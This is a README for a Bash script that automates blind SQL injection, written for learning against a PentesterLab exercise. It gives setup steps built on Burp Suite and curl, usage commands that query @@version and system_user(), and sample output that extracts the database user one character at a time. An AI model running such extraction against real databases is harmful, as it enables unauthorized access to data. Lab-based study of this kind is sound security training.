# Blind SQL injection script
This is a Bash script which automates blind SQL injections by testing characters: `{0..9} {A..z} . .. ; : - _ @`
It was written and tested based on this [PentesterLab course](https://pentesterlab.com/exercises/from_sqli_to_shell/course) which actually supports in-band SQL injection which is highly preferable to blind SQLIs. However, this was written for the sake of learning how to automate blind SQL injections, since all in-band SQLIs can be treated as blind SQL injections but not vice versa.

Previously I used a similar script but for an eLS PTP lab. Since that lab is not open to the public and I haven't found a free one publicly available, this will do. This script was not originally written by me, I used [this for reference](https://github.com/chilico/SQLblind) which itself appeared to be copied from eLS's PTP course on Web app pentesting.

## Important:
This script requires heavy editing. You have to use Burpsuite to test the SQLI parameters, then copy as `curl`, replace the curl syntax in this script, together with `$URL`, `$truestring`.

## Usage
`./SQLblind.sh 20 '@@version'`

`./SQLblind.sh 20 'system_user()'`

## Sample output
```
root@Kali:~/Web# ./SQLblind.sh 30 'system_user()'
Edit the $URL,$truestring and curl command before you use it. Basically change almost everything :) 
Usage: ./SQLblind.sh max-length 'query'
Eg. ./SQLblind.sh 20 'database()' 
Eg. ./SQLblind.sh 30 '@@version'
extracting the results from query system_user()...
Character number 1 found: P
Character number 2 found: E
Character number 3 found: N
Character number 4 found: T
Character number 5 found: E
Character number 6 found: S
Character number 7 found: T
Character number 8 found: E
Character number 9 found: R
Character number 10 found: L
Character number 11 found: A
Character number 12 found: B
Character number 13 found: @
Character number 14 found: L
Character number 15 found: O
Character number 16 found: C
Character number 17 found: A
Character number 18 found: L
Character number 19 found: H
Character number 20 found: O
Character number 21 found: S
Character number 22 found: T
Results: PENTESTERLAB@LOCALHOST

```
